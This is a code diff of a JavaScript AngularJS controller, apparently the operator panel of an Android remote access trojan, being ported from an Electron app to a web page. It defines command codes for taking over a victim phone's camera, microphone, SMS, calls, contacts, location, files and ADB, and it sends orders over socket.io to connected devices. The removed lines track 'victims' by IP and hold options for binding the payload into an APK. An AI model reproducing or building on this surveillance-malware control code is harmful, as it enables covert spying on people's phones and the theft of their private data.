@@ -1,90 +1,88 @@
 
 var app = angular.module('myapp', []);
+/*var CONSTANTS.logColors = { RED: "red", GREEN: "green", DEFAULT: "white" };
+CONSTANTS.logStatus = { SUCCESS: 1, FAIL: 0 };*/
 
+var socket;
+var port = 42474;
 
-app.controller("AppCtrl", ($scope) => {
+/*CONSTANTES*/
+var order = 'order';
+var orders = {
+    camera: 'x0000ca',
+    fileManager: 'x0000fm',
+    calls: 'x0000cl',
+    sms: 'x0000sm',
+    mic: 'x0000mc',
+    location: 'x0000lm',
+    contacts: 'x0000cn',
+	adb: 'x0000ac',
+};
+
+app.controller("AppCtrl", ($scope,$http) => {
     $appCtrl = $scope;
-    //$appCtrl.victims = viclist;
-    $appCtrl.isVictimSelected = true;
-    $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk
+
     var log = document.getElementById("log");
     $appCtrl.logs = [];
-    $('.menu .item')
-        .tab();
-    $('.ui.dropdown')
-        .dropdown();
-
-    //const window = remote.getCurrentWindow();
-	
-    /*$appCtrl.close = () => {
-        window.close();
-    };
-
-    $appCtrl.minimize = () => {
-        window.minimize();
-    };*/
 	
 	var socket = io.connect('http://localhost:42474',{ query: "web=true" });
 
 	socket.on('connection', function (data) {
-	  //alert("conection");
-	  //debugger;
-	 //console.log('Nueva Conexion Client');
-	 //socket.emit('my other event', { my: 'data' });
+	
 	});
+	
+	socket.on('enviarListado', function (data) {
+		debugger;
+		console.log("Listado : " + data);
+		localStorage.setItem("socketid", data);
+	});
+	
+	$appCtrl.getCamList = () => {
+		socket.emit(order, { order: orders.camera, extra: 'camList', idsocket: localStorage.getItem("socketid")  });
+    };
+	
+	socket.on(orders.camera, function (data) {
+		debugger;
+		console.log("Listado : " + data);
+	});
+	
+    /*	
+	var socket = io.connect('http://localhost:42474',{ query: "web=true" });
 
-    // when user clicks Listen button
-    $appCtrl.Listen = (port) => {
+	socket.on('connection', function (data) {
+
+	});*/
+
+    /*$appCtrl.Listen = (port) => {
         if (!port) {
             port = 42474;
         }
+		var dataObj = {
+				port : port
+		};	
+		
+		var res = $http.post('/listenport', dataObj);
+		
+		res.success(function(data, status, headers, config) {
+			socket = io.connect('http://localhost:' + port,{ query: "web=true" });
+			socket.on('connection', function (data) {
 
-        // notify the main proccess about the port and let him start listening
-        ipcRenderer.send("SocketIO:Listen", port);
-        $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
-    }
-
-
-    // fired when main peoccess (main.js) send any new notification about new victim
-    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
-        // add the new victim to the list
-        viclist[index] = victimsList.getVictim(index);
-        $appCtrl.Log("New victim from " + viclist[index].ip);
-        $appCtrl.$apply();
-    });
-
-
-    // fired if listening brings error
-    ipcRenderer.on("SocketIO:Listen", (event, error) => {
-        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
-        $appCtrl.isListen = false;
-        $appCtrl.$apply()
-    });
-
-
-    // fired when main peoccess (main.js) send any new notification about disconnected victim
-    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
-        $appCtrl.Log("Victim disconnected " + viclist[index].ip);
-        // delete him from list
-        delete viclist[index];
-        $appCtrl.$apply();
-    });
-
-
-    // notify the main proccess (main.js) to open the lab
-    $appCtrl.openLab = (index) => {
-        ipcRenderer.send('openLabWindow', 'lab.html', index);
-    }
-
-
-    // app logs to print any new log in the black terminal
+			});
+		});
+		
+		res.error(function(data, status, headers, config) {
+		});
+        
+        $appCtrl.Log("Listening on port => " + port);
+    };*/
+    
     $appCtrl.Log = (msg, status) => {
-
-        $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
+        //$appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
+		$appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg });
         log.scrollTop = log.scrollHeight;
         if (!$appCtrl.$$phase)
             $appCtrl.$apply();
-    }
+    };
 
 
 });
